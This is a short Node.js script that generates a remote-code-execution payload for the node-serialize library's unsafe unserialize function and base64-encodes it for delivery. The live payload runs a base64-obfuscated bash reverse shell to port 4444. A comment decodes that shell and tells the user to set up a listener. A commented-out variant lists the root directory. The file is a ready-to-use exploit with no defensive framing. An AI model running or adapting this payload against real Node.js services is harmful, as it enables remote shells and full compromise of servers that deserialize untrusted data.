var serialize = require('node-serialize');
const base64 = require('base-64');

//var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
//serialized = serialize.unserialize(payload);


var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg== | base64 -d | bash\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
encoded = base64.encode(payload);
console.log(encoded);
//decoded = base64.decode(encoded);
//serialized = serialize.unserialize(decoded);
//
//NB:
//base64.encode(bash -i >& /dev/tcp/127.0.0.1/4444 0>&1) = YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg==
//Make sure you listen on port 4444 or just change it according to your case.
